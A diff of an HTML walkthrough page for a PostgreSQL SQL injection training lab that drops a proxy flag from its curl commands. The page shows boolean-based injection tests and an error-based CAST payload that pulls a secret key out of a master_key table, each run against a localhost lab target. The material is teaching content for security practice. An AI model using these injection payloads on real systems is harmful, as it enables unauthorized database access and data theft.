@@ -11,7 +11,7 @@
         <span class="terminal-title">Step 1. Baseline Test</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab10" \<br> --data-urlencode "page=/home"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/pgsql/lab10" \<br> --data-urlencode "page=/home"<br><br>
         <span class="prompt">Response: </span>1 | /home | 15234
     </div>
 </div>
@@ -29,9 +29,9 @@
         <span class="terminal-title">Step 2. Injection Confirmation</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab10" \<br> --data-urlencode "page=/home' AND 1=1 -- -"<br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/pgsql/lab10" \<br> --data-urlencode "page=/home' AND 1=1 -- -"<br>
         <span class="prompt">Response: </span>1 | /home | 15234 (TRUE -- row returned)<br><br>
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab10" \<br> --data-urlencode "page=/home' AND 1=2 -- -"<br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/pgsql/lab10" \<br> --data-urlencode "page=/home' AND 1=2 -- -"<br>
         <span class="prompt">Response: </span>No analytics data found for that page. (FALSE -- no rows)
     </div>
 </div>
@@ -49,7 +49,7 @@
         <span class="terminal-title">Step 3. CAST Error Extraction</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab10" \<br> --data-urlencode "page=' AND 1=CAST((SELECT key_value FROM master_key LIMIT 1) AS INTEGER) -- -"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/pgsql/lab10" \<br> --data-urlencode "page=' AND 1=CAST((SELECT key_value FROM master_key LIMIT 1) AS INTEGER) -- -"<br><br>
         <span class="prompt">Response: </span><strong>Query Error:</strong> ERROR:  invalid input syntax for type integer: "FLAG{pg_udf_c_funct10n_rc3}"
     </div>
 </div>
@@ -68,7 +68,7 @@
         <span class="terminal-title">curl. Full Exploit</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab10" \<br> --data-urlencode "page=' AND 1=CAST((SELECT key_value FROM master_key LIMIT 1) AS INTEGER) -- -"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/pgsql/lab10" \<br> --data-urlencode "page=' AND 1=CAST((SELECT key_value FROM master_key LIMIT 1) AS INTEGER) -- -"<br><br>
         <span class="prompt">Response: </span><strong>Query Error:</strong> ERROR:  invalid input syntax for type integer: "FLAG{pg_udf_c_funct10n_rc3}"
     </div>
 </div>
